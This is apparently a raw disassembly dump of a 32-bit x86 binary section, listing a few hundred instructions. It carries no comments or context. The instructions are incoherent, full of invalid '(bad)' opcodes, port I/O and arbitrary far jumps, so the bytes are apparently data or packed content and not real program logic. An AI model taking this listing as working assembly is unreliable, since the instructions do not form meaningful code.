  413c98:	out    0x89,eax
  413c9a:	push   0x7b366935
  413c9f:	outs   dx,BYTE PTR ds:[esi]
  413ca0:	daa    
  413ca1:	mov    dh,0xb1
  413ca3:	sbb    al,0xb4
  413ca5:	inc    ebp
  413ca6:	icebp  
  413ca7:	(bad)  
  413ca8:	xchg   ebx,eax
  413ca9:	iret   
  413caa:	inc    edx
  413cab:	scas   al,BYTE PTR es:[edi]
  413cac:	fwait
  413cad:	in     eax,0x2b
  413caf:	push   edx
  413cb0:	mov    WORD PTR [edx+edx*8-0x47],gs
  413cb4:	mov    ds:0xde01cd02,al
  413cb9:	jo     0x413c42
  413cbb:	add    eax,0xceaacb47
  413cc0:	jne    0x413c89
  413cc2:	mov    eax,0xdf529653
  413cc7:	push   DWORD PTR [esi-0x4548124d]
  413ccd:	or     ah,bl
  413ccf:	cmp    ebp,ebx
  413cd1:	cmp    BYTE PTR [esi+eiz*1+0x2e],0xfc
  413cd6:	dec    esi
  413cd7:	pop    ebp
  413cd8:	pop    esi
  413cd9:	stos   BYTE PTR es:[edi],al
  413cda:	rcr    BYTE PTR [eax+0x33e059a9],0xba
  413ce1:	dec    ecx
  413ce2:	ret    
  413ce3:	sbb    BYTE PTR [ebp+0x3b],0xeb
  413ce7:	retf   
  413ce8:	dec    edi
  413ce9:	(bad)  
  413cea:	je     0x413d5f
  413cec:	cmp    DWORD PTR [ebx],esi
  413cee:	je     0x413d48
  413cf0:	and    al,0x80
  413cf2:	test   al,0xdc
  413cf4:	in     eax,dx
  413cf5:	in     eax,dx
  413cf6:	pop    edx
  413cf7:	inc    ebx
  413cf8:	and    al,0x87
  413cfa:	cld    
  413cfb:	jmp    0x26b80886
  413d00:	add    al,0x94
  413d02:	xor    ch,ch
  413d04:	dec    ecx
  413d05:	xchg   esi,eax
  413d06:	add    al,0x20
  413d08:	(bad)  
  413d09:	shl    DWORD PTR [ecx+0x8],cl
  413d0c:	pop    ds
  413d0d:	dec    ecx
  413d0e:	sbb    dh,BYTE PTR [esi-0x5a7b61ad]
  413d14:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  413d16:	test   DWORD PTR [esi-0x5a],esp
  413d19:	pop    edx
  413d1a:	add    al,0x2
  413d1c:	dec    ebp
  413d1d:	popa   
  413d1e:	mov    ecx,DWORD PTR [eax-0x21b35acd]
  413d24:	mov    WORD PTR ds:0xc1ca1ec7,ds
  413d2a:	and    ax,0xf643
  413d2e:	add    BYTE PTR [ebx+0x59a3a67],cl
  413d34:	xchg   ecx,eax
  413d35:	stc    
  413d36:	push   eax
  413d37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d38:	mov    edx,0x4c03d701
  413d3d:	jb     0x413cd5
  413d3f:	or     esi,DWORD PTR [eax+0x17dbcda7]
  413d45:	push   edx
  413d46:	rcr    ch,1
  413d48:	aaa    
  413d49:	popf   
  413d4a:	sbb    DWORD PTR [edi],ebx
  413d4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d4d:	mov    cl,0x3b
  413d4f:	mov    al,ds:0x170df60c
  413d54:	js     0x413d08
  413d56:	es test eax,0x2657a932
  413d5c:	sbb    eax,DWORD PTR [esi]
  413d5e:	or     al,0xf7
  413d60:	push   ss
  413d61:	(bad)  
  413d62:	xchg   ebp,eax
  413d63:	dec    esi
  413d64:	jns    0x413dbb
  413d66:	and    esi,DWORD PTR [ecx-0x2b]
  413d69:	mov    bl,0x8d
  413d6b:	pop    edx
  413d6c:	xor    BYTE PTR [esi],bh
  413d6e:	push   ds
  413d6f:	push   0xcdf6313d
  413d74:	test   eax,0x9fff7c9e
  413d79:	aam    0x42
  413d7b:	lahf   
  413d7c:	xor    BYTE PTR [edx+edx*8+0x6179cd80],dl
  413d83:	lods   eax,DWORD PTR ds:[esi]
  413d84:	push   edi
  413d85:	inc    esp
  413d86:	inc    esi
  413d87:	bnd jo 0x413dc8
  413d8a:	sub    eax,0xa2e5445e
  413d8f:	xchg   ecx,eax
  413d90:	nop
  413d91:	add    BYTE PTR [esi-0x7c],dh
  413d94:	iret   
  413d95:	mov    eax,ds:0xf70399ba
  413d9a:	push   ebp
  413d9b:	jecxz  0x413dd7
  413d9d:	nop
  413d9e:	mov    al,0x8e
  413da0:	je     0x413d43
  413da2:	inc    eax
  413da3:	xor    ecx,DWORD PTR [edx+0x10]
  413da6:	ja     0x413d60
  413da8:	xchg   edx,eax
  413da9:	mov    DWORD PTR [ebx],ebp
  413dab:	pop    ds
  413dac:	pop    eax
  413dad:	les    eax,FWORD PTR ds:0x227954be
  413db3:	icebp  
  413db4:	(bad)  
  413db5:	and    DWORD PTR [edi],edx
  413db7:	ror    al,cl
  413db9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413dba:	push   esi
  413dbb:	or     eax,0x5e29f934
  413dc0:	pop    ss
  413dc1:	aam    0xf1
  413dc3:	push   eax
  413dc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413dc5:	imul   edx,esp,0x85f27b0e
  413dcb:	(bad)
  413dcf:	in     eax,0x23
  413dd1:	popa   
  413dd2:	fs jo  0x413e08
  413dd5:	sub    ebx,DWORD PTR [ecx-0x1152a3a6]
  413ddb:	imul   ecx,DWORD PTR [eax+eax*1+0x768e068c],0xc20f70ff
  413de6:	cmc    
  413de7:	inc    edi
  413de8:	das    
  413de9:	jle    0x413de1
  413deb:	pop    ds
  413dec:	stos   BYTE PTR es:[edi],al
  413ded:	loope  0x413e2d
  413def:	inc    edx
  413df0:	fsubp  st(2),st
  413df2:	outs   dx,DWORD PTR ds:[esi]
  413df3:	leave  
  413df4:	les    edi,FWORD PTR ds:[ecx-0x4b]
  413df8:	hlt    
  413df9:	sbb    al,0x4b
  413dfb:	sbb    dl,BYTE PTR [edi+0x11f660c9]
  413e01:	mov    ecx,DWORD PTR [eax+0x4]
  413e04:	lods   al,BYTE PTR ds:[esi]
  413e05:	fisub  WORD PTR [edx-0xf]
  413e08:	dec    eax
  413e09:	ds mov edx,0xde7aead6
  413e0f:	xchg   BYTE PTR [edi-0x22],dh
  413e12:	inc    edi
  413e13:	and    al,0x84
  413e15:	shr    DWORD PTR [edx+0x6d],0xef
  413e19:	xor    eax,0x29e8699
  413e1e:	ins    DWORD PTR es:[edi],dx
  413e1f:	aad    0x41
  413e21:	fnstsw WORD PTR [ebp-0x3afc2a55]
  413e27:	int3   
  413e28:	dec    ebx
  413e29:	xor    al,0x34
  413e2b:	es enter 0xe5ed,0xa9
  413e30:	outs   dx,DWORD PTR ds:[esi]
  413e31:	mov    ch,0xa2
  413e33:	mov    ch,0xbc
  413e35:	rol    bh,cl
  413e37:	(bad)  
  413e38:	cld    
  413e39:	ret    
  413e3a:	jmp    DWORD PTR [edx+0x208fe805]
  413e40:	call   0xeee5:0x2659d6be
  413e47:	push   es
  413e48:	ins    BYTE PTR es:[edi],dx
  413e49:	and    DWORD PTR [edi-0x5e7ab9e7],eax
  413e4f:	stc    
  413e50:	(bad)  
  413e51:	ins    DWORD PTR es:[edi],dx
  413e52:	jge    0x413ddb
  413e54:	mov    edi,0x3ef605bd
  413e59:	jmp    0x413e5a
  413e5b:	(bad)  
  413e5d:	cmp    al,0xa3
  413e5f:	xor    BYTE PTR [ebx+ebx*1],cl
  413e62:	js     0x413ee2
  413e64:	(bad)  
  413e65:	enter  0x97cb,0x85
  413e69:	jecxz  0x413e4a
  413e6b:	mov    bl,BYTE PTR [esi]
  413e6d:	push   cs
  413e6e:	mov    ecx,0x2ffb02c4
  413e73:	pop    ebp
  413e74:	cld    
  413e75:	mov    ebp,0xb6fa5c35
  413e7a:	pop    esp
  413e7b:	push   esi
  413e7c:	popf   
  413e7d:	frstor [edx]
  413e7f:	inc    ecx
  413e80:	lods   eax,DWORD PTR ds:[esi]
  413e81:	pop    ds
  413e82:	ins    BYTE PTR es:[edi],dx
  413e83:	pop    ss
  413e84:	inc    ebx
  413e85:	jecxz  0x413e42
  413e87:	in     al,dx
  413e88:	dec    eax
  413e89:	imul   edx,DWORD PTR [edi],0xfe2f0caf
  413e8f:	sbb    eax,0xcdd96784
  413e94:	lds    edi,FWORD PTR [ebp-0x20afa96d]
  413e9a:	jg     0x413eb4
  413e9c:	test   al,0x50
  413e9e:	repz mov esi,0xc53a4c4c
  413ea4:	pop    ebp
  413ea5:	jno    0x413e5c
  413ea7:	xchg   ecx,eax
  413ea8:	test   DWORD PTR [esi-0x38],edi
  413eab:	mov    cl,0x31
  413ead:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413eae:	inc    edi
  413eaf:	push   es
  413eb0:	dec    eax
  413eb1:	mov    ds:0x835ce9d3,eax
  413eb6:	xor    eax,0x8ae906c6
  413ebb:	test   bl,dh
  413ebd:	sbb    eax,0xfe6919c7
  413ec2:	add    al,0xc0
  413ec4:	cmp    edi,ecx
  413ec6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ec7:	pushf  
  413ec8:	mov    al,ds:0xbf79e623
  413ecd:	pusha  
  413ece:	mov    eax,ds:0x51eada7b
  413ed3:	cmp    dl,ah
  413ed5:	test   eax,eax
  413ed7:	(bad)  
  413ed9:	push   edx
  413eda:	sar    BYTE PTR [eax+0x35],cl
  413edd:	jecxz  0x413ecc
  413edf:	jns    0x413ee0
  413ee1:	inc    ebp
  413ee2:	mov    dh,0xab
  413ee4:	das    
  413ee5:	rcl    BYTE PTR ds:0xd26a81c0,0xd8
  413eec:	pop    esp
  413eed:	jle    0x413ef7
  413eef:	aas    
  413ef0:	cli    
  413ef1:	and    ch,cl
  413ef3:	jb     0x413f27
  413ef5:	mov    ebp,0x20546e9d
  413efa:	pop    ds
  413efb:	dec    BYTE PTR [ebp+0x4b130fcb]
  413f01:	sub    eax,ebp
  413f03:	mov    eax,ds:0x394c4dee
  413f08:	cmp    ah,ah
  413f0a:	mov    ds:0xde9e0095,eax
  413f0f:	push   ebp
  413f10:	xchg   esp,eax
  413f11:	push   es
  413f12:	gs bnd jno 0x413f47
  413f16:	pop    ds
  413f17:	cmp    edi,esp
  413f19:	add    ch,cl
  413f1b:	adc    eax,0x78e2d519
  413f20:	shl    BYTE PTR [ebp-0xb646abc],0xd4
  413f27:	aas    
  413f28:	popf   
  413f29:	mov    edi,0xb8297645
  413f2e:	rol    BYTE PTR [edx+0xe],0x2b
  413f32:	lea    edi,fs:[ecx-0x3e]
  413f36:	pop    ebx
  413f37:	dec    esi
  413f38:	fisubr DWORD PTR [edx+0x41]
  413f3b:	aad    0x2a
  413f3d:	sbb    edx,eax
  413f3f:	aad    0xb3
  413f41:	dec    ebx
  413f42:	es mov bh,0x91
  413f45:	and    al,0xf0
  413f47:	lods   eax,DWORD PTR ds:[esi]
  413f48:	jnp    0x413f5b
  413f4a:	push   0xffffff9e
  413f4c:	rcr    DWORD PTR [ecx],1
  413f4e:	mov    edi,ecx
  413f50:	xor    BYTE PTR [esi+0x648eabb7],0xcb
  413f57:	test   al,0xfc
  413f59:	mov    ch,0x16
  413f5b:	dec    edx
  413f5c:	dec    ebp
  413f5d:	ret    0xb11b
  413f60:	cmp    al,0x9e
  413f62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f63:	xor    al,0xe2
  413f65:	jne    0x413f0d
  413f67:	in     eax,dx
  413f68:	repz fmul DWORD PTR [ebx-0x2e]
  413f6c:	retf   0x52c8
  413f6f:	outs   dx,DWORD PTR ds:[esi]
  413f70:	and    bh,al
  413f72:	dec    edi
  413f73:	pushf  
  413f74:	sub    al,0xc2
  413f76:	inc    esi
  413f77:	repnz mov es,eax
  413f7a:	push   ss
  413f7b:	loopne 0x413fe6
  413f7d:	ret    
  413f7e:	inc    ebx
  413f7f:	test   DWORD PTR [ebp+esi*4+0x6f],0x39406e42
  413f87:	fidiv  WORD PTR [esi+0x41]
  413f8a:	and    dh,BYTE PTR [esi-0x5e8f56c3]
  413f90:	icebp  
  413f91:	dec    ebx
  413f92:	push   eax
  413f93:	push   ebp
  413f94:	mov    dl,0x98
  413f96:	test   BYTE PTR [ebx+edi*2-0x3e],ch
  413f9a:	je     0x414017
  413f9c:	sahf   
  413f9d:	jb     0x413f9e
  413f9f:	lahf   
  413fa0:	out    dx,al
  413fa1:	lods   eax,DWORD PTR ds:[esi]
  413fa2:	jb     0x413fac
  413fa4:	(bad)  
  413fa5:	dec    esp
  413fa6:	and    DWORD PTR [eax-0x25],ecx
  413fa9:	sbb    dl,BYTE PTR [edi]
  413fab:	mov    WORD PTR [ebp+0x6c9cade],?
  413fb1:	inc    eax
  413fb2:	mov    ebp,0xe366a26
  413fb7:	adc    eax,0xd295fe86
  413fbc:	sti    
  413fbd:	push   edx
  413fbe:	fadd   QWORD PTR [esi+0x16]
  413fc1:	mov    cl,0x1f
  413fc3:	loopne 0x414014
  413fc5:	adc    ch,BYTE PTR [eax+ecx*4]
  413fc8:	retf   0xcbf6
  413fcb:	sub    DWORD PTR [esi+0x15a49869],ebp
  413fd1:	jle    0x413ff0
  413fd3:	enter  0x655b,0x9f
  413fd7:	aas    
  413fd8:	mov    ds:0x9eb03c59,al
  413fdd:	pop    ss
  413fde:	inc    ebp
  413fdf:	bound  ecx,QWORD PTR [ecx]
  413fe1:	daa    
  413fe2:	inc    ecx
  413fe3:	inc    eax
  413fe4:	sar    edx,0x3e
  413fe7:	bound  edi,QWORD PTR [ebx-0x64c84a4c]
  413fed:	scas   eax,DWORD PTR es:[edi]
  413fee:	hlt    
  413fef:	test   edx,0xa6c04aa
  413ff5:	fimul  DWORD PTR [ebx]
  413ff7:	pop    ecx
  413ff8:	ror    DWORD PTR [edx-0x10d982ed],1
  413ffe:	clc    
  413fff:	jle    0x41402a
  414001:	pop    eax
  414002:	ror    DWORD PTR [edx+0x6c],0xf
  414006:	ds pop edi
  414008:	mov    bl,0x2a
  41400a:	pusha  
  41400b:	loope  0x41406e
  41400d:	stos   BYTE PTR es:[edi],al
  41400e:	(bad)  
  414010:	fdivr  DWORD PTR ds:0xc1a4bcd3
  414016:	push   ebp
  414017:	dec    ecx
  414018:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414019:	adc    al,0x9e
  41401b:	(bad)  
  41401c:	jp     0x414055
  41401e:	lock pop es
  414020:	and    esp,esp
  414022:	add    edx,DWORD PTR [ecx]
  414024:	mov    eax,0x74083bc2
  414029:	xor    eax,0xe87eabf
  41402e:	xchg   ecx,eax
  41402f:	pop    esp
  414030:	fs mov eax,0x8105471c
  414036:	dec    edx
  414037:	stos   DWORD PTR es:[edi],eax
  414038:	pop    edx
  414039:	in     eax,0x1d
  41403b:	fpatan 
  41403d:	mov    eax,ds:0xa9860807
  414042:	hlt    
  414043:	retf   
  414044:	out    0x5d,eax
  414046:	mov    esi,0x1661d954
  41404b:	pop    ebx
  41404c:	pop    ebp
  41404d:	addr16 dec esp
  41404f:	adc    BYTE PTR [ebx],ch
  414051:	jl     0x4140bf
  414053:	test   ebp,esp
  414055:	mov    dh,0x55
  414057:	scas   al,BYTE PTR es:[edi]
  414058:	test   DWORD PTR [ebx-0x9477bd],edx
  41405e:	or     ebp,DWORD PTR [ebx]
  414060:	inc    edi
  414061:	out    dx,eax
  414062:	or     al,0xa5
  414064:	and    al,0x63
  414066:	fstp   DWORD PTR ds:0x5920ac08
  41406c:	repnz sbb ecx,edx
  41406f:	std    
  414070:	mov    dl,0x97
  414072:	pop    eax
  414073:	and    cl,dh
  414075:	inc    ebx
  414076:	push   ds
  414077:	pop    esi
  414078:	gs aaa 
  41407a:	add    BYTE PTR [esi-0x52],dh
  41407d:	pop    edx
  41407e:	repnz out 0x4b,al
  414081:	ins    BYTE PTR es:[edi],dx
  414082:	xchg   esp,eax
  414083:	xchg   ebp,eax
  414084:	pop    ebx
  414085:	fisttp QWORD PTR [ebx]
  414087:	mov    DWORD PTR [ebx+edi*2],edx
  41408a:	shl    ebp,1
  41408c:	sbb    eax,0x5caec6ad
  414091:	xor    ecx,DWORD PTR [edx]
  414093:	ins    DWORD PTR es:[edi],dx
  414094:	mov    bh,0xca
  414096:	int    0x45
  414098:	dec    ebp
  414099:	jmp    0x4140cb
  41409b:	lods   eax,DWORD PTR ds:[esi]
  41409c:	jge    0x414060
  41409e:	or     BYTE PTR [ebx+0x760805d9],0xf3
  4140a5:	or     al,0x8d
  4140a7:	sub    ch,BYTE PTR [ebx*4-0x2b314e85]
  4140ae:	enter  0xbcfd,0xac
  4140b2:	clc    
  4140b3:	mov    edx,0xc22a3066
  4140b8:	pop    eax
  4140b9:	sbb    al,0x8
  4140bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4140bc:	mov    ecx,0xa57b4fff
  4140c1:	icebp  
  4140c2:	ss in  al,dx
  4140c4:	ret    0x9af9
  4140c7:	jl     0x414136
  4140c9:	jl     0x414082
  4140cb:	inc    eax
  4140cc:	mov    esp,0x20113331
  4140d1:	popa   
  4140d2:	lods   al,BYTE PTR ds:[esi]
  4140d3:	lods   eax,DWORD PTR ds:[esi]
  4140d4:	loopne 0x4140ea
  4140d6:	cld    
  4140d7:	push   ecx
  4140d8:	rcl    eax,cl
  4140da:	mov    ah,0x1
  4140dc:	sub    al,0x81
  4140de:	addr16 call 0x66da28e9
  4140e4:	push   cs
  4140e5:	ss nop ecx
  4140e9:	xchg   bh,al
  4140eb:	dec    esi
  4140ec:	xor    al,0x1d
  4140ee:	and    BYTE PTR [edx-0x34],ch
  4140f1:	int    0xaf
  4140f3:	dec    edi
  4140f4:	or     eax,0x47a6de2c
  4140f9:	xchg   DWORD PTR [edx+edx*8+0x42],ebp
  4140fd:	dec    edx
  4140fe:	mov    al,dh
  414100:	int    0x7e
  414102:	mov    BYTE PTR es:[eax+0x3e6926af],cl
  414109:	test   dl,0x13
  41410c:	adc    BYTE PTR [edx],ch
  41410e:	das    
  41410f:	bound  esp,QWORD PTR [edi]
  414111:	sub    al,0x7f
  414113:	jno    0x41413e
  414115:	and    BYTE PTR [ebx],bh
  414117:	(bad)  
  414118:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414119:	xor    eax,0xc47fc69
  41411e:	push   ds
  41411f:	icebp  
  414120:	mov    edi,0x44a5d74d
  414125:	mul    DWORD PTR [eax+0x1d27d99d]
  41412b:	mov    ah,0x1b
  41412d:	dec    ecx
  41412e:	or     al,0x8d
  414130:	out    0x10,eax
  414132:	mov    bh,BYTE PTR [ecx+0x34]
  414135:	dec    ebx
  414136:	icebp  
  414137:	sub    DWORD PTR [edi],0xdcabe254
  41413d:	push   ebp
  41413e:	pop    ecx
  41413f:	xor    eax,0xc5395aed
  414144:	pop    esi
  414145:	sahf   
  414146:	cmc    
  414147:	retf   0x6543
  41414a:	in     eax,dx
  41414b:	or     eax,0xcfd65254
  414150:	daa    
  414151:	js     0x41418b
  414153:	cvtps2pd xmm3,QWORD PTR ds:0xee2c35de
  41415a:	adc    bh,BYTE PTR [ebp-0x1e]
  41415d:	push   ds
  41415e:	cmp    esp,ebx
  414160:	mov    esi,0x56e8a6b2
  414165:	std    
  414166:	bound  eax,QWORD PTR [ebx-0x7ed54a4e]
  41416c:	jmp    0x3712:0xd805437c
  414173:	hlt    
  414174:	aaa    
  414175:	xor    eax,0x468c48c2
  41417a:	mov    DWORD PTR ds:0x383da0b6,ebp
  414180:	imul   ecx,DWORD PTR [ecx-0x643c992],0x75
  414187:	(bad)  
  414188:	jmp    0x4141a5
  41418a:	int    0x46
  41418c:	jp     0x41411c
  41418e:	sbb    DWORD PTR [edx+0x7a],edx
  414191:	rcl    ecx,cl
  414193:	mov    ah,0x7e
  414195:	and    DWORD PTR [ecx+ebx*1-0x4214c7f4],0x24057034
  4141a0:	pusha  
  4141a1:	jl     0x414141
  4141a3:	jae    0x41417c
  4141a5:	cwde   
  4141a6:	push   ss
  4141a7:	hlt    
  4141a8:	(bad)  
  4141a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141aa:	fmul   DWORD PTR [ebx-0x5451d190]
  4141b0:	iret   
  4141b1:	jae    0x4141be
  4141b3:	mov    esp,0x62aa91e6
  4141b8:	imul   esp,ebx,0x3d0a2662
  4141be:	mov    ds:0xa9964cdf,eax
  4141c3:	jl     0x414198
  4141c5:	pop    ebp
  4141c6:	je     0x41420c
  4141c8:	add    esi,DWORD PTR [ebp-0x76c7675]
  4141ce:	pop    esp
  4141cf:	push   esi
  4141d0:	scas   al,BYTE PTR es:[edi]
  4141d1:	repz inc ebx
  4141d3:	leave  
  4141d4:	adc    cl,BYTE PTR [ecx-0x45]
  4141d7:	int3   
  4141d8:	popf   
  4141d9:	pop    edx
  4141da:	popf   
  4141db:	pop    edi
  4141dc:	pushf  
  4141dd:	cmp    al,0x8f
  4141df:	test   DWORD PTR [edi+eiz*2+0x611c78ee],0x1937f4ae
  4141ea:	dec    ecx
  4141eb:	pop    ss
  4141ec:	push   0xe52ac3c6
  4141f1:	cmp    dl,BYTE PTR [esi]
  4141f3:	mov    esi,0xbbb3c4f6
  4141f8:	pop    esi
  4141f9:	mov    ah,0xca
  4141fb:	aas    
  4141fc:	jo     0x414258
  4141fe:	test   dh,dh
  414200:	mov    ds:0x38f48e7a,al
  414205:	nop
  414206:	stos   BYTE PTR es:[edi],al
  414207:	(bad)  
  414209:	inc    edi
  41420a:	push   eax
  41420b:	sub    eax,0x8f585b0b
  414210:	idiv   cl
  414212:	ss retf 
  414214:	call   0x88f0:0xbf9896ed
  41421b:	retf   0x5264
  41421e:	push   ebp
  41421f:	cmp    ebp,DWORD PTR [eax]
  414221:	int    0xa6
  414223:	cmp    esi,DWORD PTR ds:0x5fe787a1
  414229:	xchg   ecx,eax
  41422a:	imul   esi,DWORD PTR [eax],0x220d2696
  414230:	pop    esp
  414231:	ins    DWORD PTR es:[edi],dx
  414232:	into   
  414233:	fbld   TBYTE PTR [eax-0x67]
  414236:	loop   0x4142b4
  414238:	and    eax,0xd919d1ab
  41423d:	pop    ebx
  41423e:	fisub  WORD PTR [edi-0x2bb40d2b]
  414244:	pop    ss
  414245:	cld    
  414246:	jno    0x41422b
  414248:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414249:	or     BYTE PTR [ecx+edi*4+0x13],dl
  41424d:	(bad)  
  41424e:	jns    0x41421f
  414250:	sub    al,0xc
  414252:	out    dx,eax
  414253:	or     al,BYTE PTR [edx+ecx*1-0x45]
  414257:	div    dl
  414259:	out    0x38,eax
  41425b:	cld    
  41425c:	mov    edx,0x7b01f7be
  414261:	xor    al,BYTE PTR [ebp+0x6f]
  414264:	sub    BYTE PTR [ebx],0x2
  414267:	cmp    ebx,eax
  414269:	add    bl,BYTE PTR [ebx+0x7554d85a]
  41426f:	sbb    BYTE PTR [ecx-0x15],0x4c
  414273:	inc    esi
  414274:	lods   al,BYTE PTR ds:[esi]
  414275:	dec    esp
  414276:	sbb    BYTE PTR [ebx-0x20],al
  414279:	or     BYTE PTR [ebp-0x18],0x54
  41427d:	test   al,0xf2
  41427f:	js     0x4142fa
  414281:	xor    dh,BYTE PTR [eax+0x139d3750]
  414287:	push   es
  414288:	out    0xa0,al
  41428a:	and    al,0x4d
  41428c:	mov    edx,0x1096db1e
  414291:	mov    edx,0xbde933a1
  414296:	dec    ecx
  414297:	inc    edi
  414298:	add    al,0x87
  41429a:	cmp    BYTE PTR [edx-0x3b],al
  41429d:	outs   dx,DWORD PTR ds:[esi]
  41429e:	mov    ds:0x6f673b70,al
  4142a3:	sahf   
  4142a4:	inc    edi
  4142a5:	xor    al,0xda
  4142a7:	cld    
  4142a8:	imul   ecx,DWORD PTR [ecx],0xffffffb8
  4142ab:	inc    ebp
  4142ac:	jno    0x41428c
  4142ae:	ror    ah,0xe2
  4142b1:	adc    bh,0xe9
  4142b4:	ret    
  4142b5:	add    bh,BYTE PTR [ebx+0x3b]
  4142b8:	pusha  
  4142b9:	pop    esi
  4142ba:	push   ecx
  4142bb:	cmp    esi,DWORD PTR [esi]
  4142bd:	mov    ecx,0x740d1f32
  4142c2:	iret   
  4142c3:	pusha  
  4142c4:	push   edi
  4142c5:	sbb    BYTE PTR [edi-0x83a382e],al
  4142cb:	dec    esp
  4142cc:	pop    ebx
  4142cd:	mov    edx,0xb9582085
  4142d2:	scas   al,BYTE PTR es:[edi]
  4142d3:	int3   
  4142d4:	repz or BYTE PTR [edi+0x5f],al
  4142d8:	sbb    ebp,0xdf292b54
  4142de:	ss je  0x41430b
  4142e1:	mov    ds:0x2c8a0191,al
  4142e6:	ins    DWORD PTR es:[edi],dx
  4142e7:	jb     0x4142ca
  4142e9:	ss inc ebx
  4142eb:	into   
  4142ec:	adc    BYTE PTR [ecx+0x546d2b6d],ch
  4142f2:	aaa    
  4142f3:	fwait
  4142f4:	inc    esp
  4142f5:	jns    0x4142b0
  4142f7:	sti    
  4142f8:	sub    eax,0x18c934b8
  4142fd:	pop    es
  4142fe:	imul   ebx,DWORD PTR [ecx],0x76
  414301:	aas    
  414302:	mov    al,BYTE PTR [edi-0x26]
  414305:	in     al,0x57
  414307:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414308:	scas   eax,DWORD PTR es:[edi]
  414309:	jno    0x4142a1
  41430b:	pushf  
  41430c:	inc    eax
  41430d:	mov    ebp,0xff7ad156
  414312:	dec    edi
  414313:	mov    eax,0x9198f2d0
  414318:	xor    DWORD PTR [esi-0x66],eax
  41431b:	out    dx,eax
  41431c:	xchg   edi,eax
  41431d:	push   ebp
  41431e:	(bad)  
  41431f:	out    dx,al
  414320:	push   esi
  414321:	fisubr WORD PTR [edi+0x54]
  414324:	mov    edi,0xc851ceb1
  414329:	push   edx
  41432a:	xchg   BYTE PTR [edx-0x49],ah
  41432d:	pop    esi
  41432e:	or     DWORD PTR [edx+0x7d11332e],eax
  414334:	test   BYTE PTR [eax+0x42cf46ed],dh
  41433a:	xor    al,0x87
  41433c:	enter  0xcef3,0x35
  414340:	aad    0x4a
  414342:	jg     0x414315
  414344:	inc    edi
  414345:	retf   0xca9c
  414348:	xchg   DWORD PTR [esi+0x1e5f2f0d],esi
  41434e:	popf   
  41434f:	(bad)  
  414350:	sbb    ecx,DWORD PTR [edx-0x2de2babd]
  414356:	aad    0x65
  414358:	or     DWORD PTR [ecx-0x249ad111],esi
  41435e:	fs loope 0x4143c9
  414361:	mov    esi,0x496bdf21
  414366:	(bad)  
  414367:	out    0xa6,eax
  414369:	xor    DWORD PTR [eax],ebx
  41436b:	stos   DWORD PTR es:[edi],eax
  41436c:	jp     0x414388
  41436e:	test   eax,0x8c7ee1ef
  414373:	mov    ebx,0x202ad63
  414378:	pop    ss
  414379:	sub    al,0xb6
  41437b:	shr    DWORD PTR [esi],0x8e
  41437e:	lahf   
  41437f:	lahf   
  414380:	adc    ecx,esi
  414382:	icebp  
  414383:	adc    al,0x8b
  414385:	lods   al,BYTE PTR ds:[esi]
  414386:	(bad)  
  414388:	push   0x3a6484dd
  41438d:	mov    eax,0x1ad35b93
  414392:	fadd   QWORD PTR [eax]
  414394:	pop    esi
  414395:	dec    BYTE PTR [eax-0x48]
  414398:	ss mov dh,0x9
  41439b:	push   ecx
  41439c:	mov    ecx,0xe4a6a5ab
  4143a1:	pop    ds
  4143a2:	jmp    0x5af38c08
  4143a7:	mov    cs:0x4092ca22,eax
  4143ad:	pop    esp
  4143ae:	stos   DWORD PTR es:[edi],eax
  4143af:	sar    BYTE PTR [esi],1
  4143b1:	add    dl,BYTE PTR [eax-0x4a]
  4143b4:	and    DWORD PTR [ebx+eiz*4-0x2b],edx
  4143b8:	aaa    
  4143b9:	inc    esp
  4143ba:	bound  esi,QWORD PTR [edi+0x387d0b64]
  4143c0:	mov    eax,DWORD PTR [ecx-0x2482efce]
  4143c6:	and    edi,DWORD PTR [ebx+eiz*4+0x38]
  4143ca:	rcl    BYTE PTR [ecx-0x5c8527f],1
  4143d0:	bound  edi,QWORD PTR [edi-0x45]
  4143d3:	pop    edx
  4143d4:	in     eax,dx
  4143d5:	lds    ecx,FWORD PTR [ecx+eax*1]
  4143d8:	push   ds
  4143d9:	cmp    eax,0x4f81a935
  4143de:	addr16 jmp 0x414459
  4143e1:	out    0xfe,eax
  4143e3:	lods   al,BYTE PTR ds:[esi]
  4143e4:	and    BYTE PTR [ecx-0x7e],al
  4143e7:	mov    bh,dh
  4143e9:	cmp    al,0x73
  4143eb:	inc    esi
  4143ec:	imul   ebp,DWORD PTR ds:0x3411cb69,0xe6e37411
  4143f6:	data16 mov ch,0x6f
  4143f9:	jmp    0x43108049
  4143fe:	jp     0x4143b3
  414400:	gs loop 0x41445d
  414403:	cmp    DWORD PTR [edi],edi
  414405:	mov    eax,ds:0xbd0a4add
  41440a:	stos   BYTE PTR es:[edi],al
  41440b:	shl    BYTE PTR [ebp-0x3874940d],1
  414411:	sbb    dh,BYTE PTR [edx+0xcf4ac8a]
  414417:	inc    esi
  414418:	imul   edi,DWORD PTR [edx+0x2b],0xffffffb7
  41441c:	fs inc eax
  41441e:	mov    ch,0x7d
  414420:	loop   0x414412
  414422:	lods   eax,DWORD PTR ds:[esi]
  414423:	xchg   ebx,eax
  414424:	cmp    ebp,DWORD PTR [esi+0x749192a1]
  41442a:	push   edx
  41442b:	mov    ds:0xdb8d91d7,eax
  414430:	sub    al,0xba
  414432:	outs   dx,DWORD PTR ds:[esi]
  414433:	retf   0x2d68
  414436:	lds    edi,FWORD PTR ds:0xc3fb113f
  41443c:	arpl   WORD PTR [ebx+0x49],cx
  41443f:	rcl    BYTE PTR [ecx],0x15
  414442:	(bad)  
  414443:	jecxz  0x41446c
  414445:	shl    DWORD PTR [eax-0x23271605],1
  41444b:	pop    ss
  41444c:	cli    
  41444d:	sar    BYTE PTR [ebx-0x574cf64f],0x8e
